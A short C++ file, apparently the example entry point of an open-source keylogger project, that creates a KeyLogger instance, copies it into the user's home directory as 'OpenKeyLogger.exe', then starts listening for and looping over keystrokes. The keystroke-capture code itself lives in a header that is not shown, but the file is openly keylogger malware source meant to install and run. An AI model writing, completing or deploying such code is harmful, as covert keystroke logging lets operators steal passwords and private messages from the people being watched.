/*
Example standalone program using the KeyLogger class
*/

#include "keylogger.h"

using namespace std;

//int wWinMain(HINSTANCE hInst, HINSTANCE prevInst, LPWSTR szCmdLine, int nCmdShow)
int main()
{
    KeyLogger* kl = KeyLogger::getInstance();
    
    kl->install(kl->getUserHomeDirectory() + "OpenKeyLogger.exe");

    kl->listen();
 
    kl->loop();

    return 0;
}